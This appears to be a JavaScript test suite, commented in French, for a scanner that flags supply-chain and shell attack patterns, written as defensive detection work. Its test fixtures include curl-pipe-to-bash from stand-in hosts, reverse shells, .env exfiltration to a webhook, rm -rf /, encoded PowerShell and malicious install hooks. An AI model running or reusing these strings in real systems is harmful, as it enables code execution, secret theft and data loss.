// Vecteurs d'attaque : chaque règle a un cas vulnérable ET un cas sain.
const test = require('node:test');
const assert = require('node:assert');

const { scanAttackInText, aggregateAttack } = require('../out/attack.js');

const ids = (text, file) => scanAttackInText(file, file, text).map((f) => f.id);

// ---------------------------------------------------------------------------
// Commandes dangereuses (scripts shell)
// ---------------------------------------------------------------------------
test('curl | bash détecté dans un script', () => {
  assert.ok(ids('curl -sSL https://evil.xyz/i.sh | bash', 'setup.sh').includes('ATK-CMD-001'));
  assert.ok(ids('wget -qO- https://x.io | sudo sh', 'setup.sh').includes('ATK-CMD-001'));
  // Un simple téléchargement de fichier n'est pas une exécution.
  assert.ok(!ids('curl -o app.tar.gz https://releases.x.io/app.tar.gz', 'setup.sh').includes('ATK-CMD-001'));
});

test('payload base64 exécuté', () => {
  const payload = 'echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8= | base64 -d | sh';
  assert.ok(ids(payload, 'run.sh').includes('ATK-CMD-002'));
});

test('reverse shell détecté', () => {
  assert.ok(ids('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'x.sh').includes('ATK-CMD-004'));
  assert.ok(ids('nc 10.0.0.1 4444 -e /bin/sh', 'x.sh').includes('ATK-CMD-004'));
});

test('exfiltration de secrets vers un webhook', () => {
  assert.ok(ids('curl -F "f=@.env" https://webhook.site/abcd', 'x.sh').includes('ATK-CMD-005'));
  assert.ok(!ids('curl -d "name=toto" https://api.exemple.fr/users', 'x.sh').includes('ATK-CMD-005'));
});

test('commande destructive détectée', () => {
  assert.ok(ids('rm -rf /', 'x.sh').includes('ATK-CMD-006'));
  assert.ok(!ids('rm -rf ./node_modules/.cache', 'x.sh').includes('ATK-CMD-006'));
});

test('powershell encodé détecté', () => {
  assert.ok(ids('powershell -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQ==', 'x.ps1').includes('ATK-CMD-008'));
});

// ---------------------------------------------------------------------------
// Documentation piégée : seules les règles inDocs s'y appliquent
// ---------------------------------------------------------------------------
test('un README qui impose curl | bash est signalé', () => {
  assert.ok(ids('## Install\ncurl https://x.io/i.sh | bash', 'README.md').includes('ATK-CMD-001'));
});

test('les règles hors docs ne se déclenchent pas dans un markdown', () => {
  // chmod 777 documenté dans un tuto : pas inDocs → silence.
  assert.deepEqual(ids('Puis tapez : chmod 777 /data', 'TUTO.md'), []);
});

// ---------------------------------------------------------------------------
// Supply chain npm
// ---------------------------------------------------------------------------
test('script postinstall signalé, script réseau en critique', () => {
  assert.ok(ids('{"scripts":{"postinstall":"node setup.js"}}', 'package.json').includes('ATK-NPM-001'));
  assert.ok(ids('{"scripts":{"preinstall":"curl x.sh | sh"}}', 'package.json').includes('ATK-NPM-002'));
  // Un projet sans script d\'install ne déclenche rien.
  assert.deepEqual(ids('{"scripts":{"build":"tsc"}}', 'package.json'), []);
});

test('dépendance depuis une source non vérifiable', () => {
  assert.ok(ids('{"dependencies":{"x":"git+http://git.evil.io/x.git"}}', 'package.json').includes('ATK-NPM-003'));
  assert.ok(!ids('{"dependencies":{"lodash":"^4.17.21"}}', 'package.json').includes('ATK-NPM-003'));
});

test('token npm commité', () => {
  assert.ok(ids('//registry.npmjs.org/:_authToken=npm_abcd1234', '.npmrc').includes('ATK-NPM-005'));
  assert.ok(ids('registry=http://internal.corp/npm', '.npmrc').includes('ATK-NPM-004'));
});

// ---------------------------------------------------------------------------
// Python / Rust / autres écosystèmes
// ---------------------------------------------------------------------------
test('dependency confusion pip', () => {
  assert.ok(ids('requests==2.31.0\n--extra-index-url https://pypi.evil.io', 'requirements.txt').includes('ATK-PY-002'));
  assert.ok(ids('git+http://github.com/x/y.git', 'requirements.txt').includes('ATK-PY-001'));
  assert.deepEqual(ids('requests==2.31.0', 'requirements.txt'), []);
});

test('code exécuté dans setup.py', () => {
  assert.ok(ids('import os\nos.system("curl evil.sh")', 'setup.py').includes('ATK-PY-003'));
  assert.deepEqual(ids('from setuptools import setup\nsetup(name="x")', 'setup.py'), []);
});

test('build.rs avec réseau ou exécution', () => {
  assert.ok(ids('fn main() { std::process::Command::new("curl"); }', 'build.rs').includes('ATK-RS-001'));
});

// ---------------------------------------------------------------------------
// .gitignore sans .env
// ---------------------------------------------------------------------------
test('.gitignore sans .env signalé, avec .env silencieux', () => {
  assert.ok(ids('node_modules/\ndist/\n', '.gitignore').includes('ATK-GIT-001'));
  assert.ok(!ids('node_modules/\n.env\n', '.gitignore').includes('ATK-GIT-001'));
  assert.ok(!ids('node_modules/\n.env.*\n', '.gitignore').includes('ATK-GIT-001'));
});

// ---------------------------------------------------------------------------
// Format des findings
// ---------------------------------------------------------------------------
test('.env non ignoré : préventif, pas critique', () => {
  // Ce module ne voit qu'un fichier : il ignore si un .env existe vraiment.
  // C'est NDK-AUD-001 (audit.ts) qui escalade quand c'est le cas.
  const [f] = scanAttackInText('.gitignore', '.gitignore', 'node_modules/\n');
  assert.equal(f.severity, 'medium');
});

// ---------------------------------------------------------------------------
// Regroupement des motifs systémiques
// ---------------------------------------------------------------------------
test('les install.sh d\'outils embarqués comptent pour une seule décision', () => {
  // Cas réel : 23 curl|bash identiques dans les extensions d'un outil tiers.
  const many = Array.from({ length: 23 }, (_, i) => ({
    kind: 'attack',
    severity: 'critical',
    id: 'ATK-CMD-001',
    title: 'curl | bash (ATK-CMD-001)',
    description: 'x',
    file: `vendor/ext${i}/install.sh`,
    line: 22,
  }));
  const out = aggregateAttack(many);
  assert.equal(out.length, 1);
  assert.ok(out[0].title.includes('23 occurrence'));
  assert.ok(out[0].description.includes('… et 15 autre(s)'));
});

test('un reverse shell reste signalé une fois par emplacement', () => {
  const two = ['a.sh', 'b.sh'].map((file) => ({
    kind: 'attack',
    severity: 'critical',
    id: 'ATK-CMD-004',
    title: 'Reverse shell',
    description: 'x',
    file,
    line: 1,
  }));
  assert.equal(aggregateAttack(two).length, 2, 'chaque occurrence est un incident distinct');
});

test('chaque finding documente l\'attaque ET la prévention', () => {
  const [f] = scanAttackInText('setup.sh', 'setup.sh', 'curl x.sh | bash');
  assert.equal(f.kind, 'attack');
  assert.match(f.description, /ATTAQUE/);
  assert.match(f.description, /PRÉVENTION/);
});
